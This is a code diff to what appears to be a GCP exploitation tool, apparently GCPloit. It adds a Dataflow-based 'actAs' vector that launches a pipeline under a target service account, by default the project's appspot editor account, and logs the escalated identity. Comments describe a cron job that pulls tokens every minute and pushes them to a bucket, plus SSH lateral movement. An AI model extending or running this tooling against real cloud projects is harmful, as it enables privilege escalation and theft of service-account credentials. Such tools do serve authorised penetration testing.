@@ -14,6 +14,7 @@ import argparse
 from base_cloud_function import main as base_cf
 from base_vm_instance import main as base_vm
 from base_notebook_instance import main as base_notebook
+from base_dataflow_pipeline import main as base_dataflow
 from utils import utils
 
 engine = create_engine('sqlite:///db/db.sql')
@@ -81,7 +82,7 @@ def deploy_notebook(project, source=None, target=None, bucket=None, role="unknow
         caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
         success = base_notebook.create_notebook_in_another_project(project, target, instance_props, bucket)
         if not success or success == "False":
-            print("Failed to provision VM")
+            print("Failed to provision dataflow notebook VM")
             return False
         creator_email = ""
     else:
@@ -104,6 +105,45 @@ def deploy_notebook(project, source=None, target=None, bucket=None, role="unknow
 
     print("successfully privesced the {} identitiy".format(target))
     return fun_notebook_instance
+
+def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
+    # Create instance via notebook notebooks in default network
+    # SSH commands via vm for lateral movementa
+    # cron job pulls token every minute and pushes up
+    utils.run_gcloud_command_local("gcloud config set project {}".format(project))
+    instance_props = {"name": utils.random_name()}
+
+    if not target:
+        target = "{}@appspot.gserviceaccount.com".format(project)
+        role = "editor"
+    if not source:
+        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
+        caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
+        success = base_dataflow.create_pipeline_in_another_project(project, target, instance_props, bucket)
+        if not success or success == "False":
+            print("Failed to provision Pipeline")
+            return False
+        creator_email = ""
+    else:
+        source = db_session.query(models.CloudObject).filter_by(name=source).first()
+        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket)
+        caller_identity = source.identity
+        token = source.cred
+        proc = activate_sketch_proxy(token)
+        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
+        success = base_dataflow.create_pipeline_in_another_project(project, target, instance_props, bucket)
+        deactivate_sketch_proxy(proc)
+        if not success or success == "False":
+            print("Failed to provision dataflow pipeline")
+            return False
+        creator_email = source.serviceAccount
+
+    fun_pipeline_instance = models.CloudObject(project=project, role=role, serviceAccount=target, evilPassword="", name=instance_props["name"], cred="", creator_identity=caller_identity, creator_email=creator_email, infastructure="dataflow", identity="")
+    db_session.add(fun_pipeline_instance)
+    db_session.commit()
+
+    print("successfully privesced the {} identitiy".format(target))
+    return fun_pipeline_instance
 
 def deploy_vm(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
     # Create instance in default network
@@ -226,7 +266,7 @@ def main():
     parser.add_argument('--exploit', dest='exploit',
                     help='the name of the exploit you want to run on the given target, e.g. actAs all')
     parser.add_argument('--actAsMethod', default='cf', dest='actasmethod',
-                    choices=['cf','vm','notebook'],
+                    choices=['cf','vm','notebook','dataflow'],
                     help='what actAs vector you would like to use.')
     parser.add_argument('--bucket', dest='bucket',
                     help='bucket for GCPloit credential storage.')
@@ -258,7 +298,8 @@ def main():
                 print("*************************************************")
 
             if (args.actasmethod == "notebook" or
-                    args.actasmethod == "vm") and not args.bucket:
+                    args.actasmethod == "vm" or 
+                    args.actasmethod == "dataflow") and not args.bucket:
                 print("What bucket do you want to store credentials into?")
                 print("set --bucket <bucket>")
                 print("Make sure your instance has write access to the bucket URL.")
@@ -276,6 +317,8 @@ def main():
                         new_object = deploy_vm(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                     if args.actasmethod == "notebook":
                         new_object = deploy_notebook(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
+                    if args.actasmethod == "dataflow":
+                        new_object = deploy_pipeline(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                     print("~~~~~~~Got New Identity~~~~~~~~")
                     print(new_object)
             else:
@@ -285,6 +328,8 @@ def main():
                     new_object = deploy_vm(args.project, args.source, args.target, args.bucket, args.bucketproj)
                 if args.actasmethod == "notebook":
                     new_object = deploy_notebook(args.project, args.source, args.target, args.bucket, args.bucketproj)
+                if args.actasmethod == "dataflow":
+                    new_object = deploy_pipeline(args.project, args.source, args.target, args.bucket, args.bucketproj)
                 if new_object:
                     print("~~~~~~~Got New Identity~~~~~~~~")
                     print(new_object)
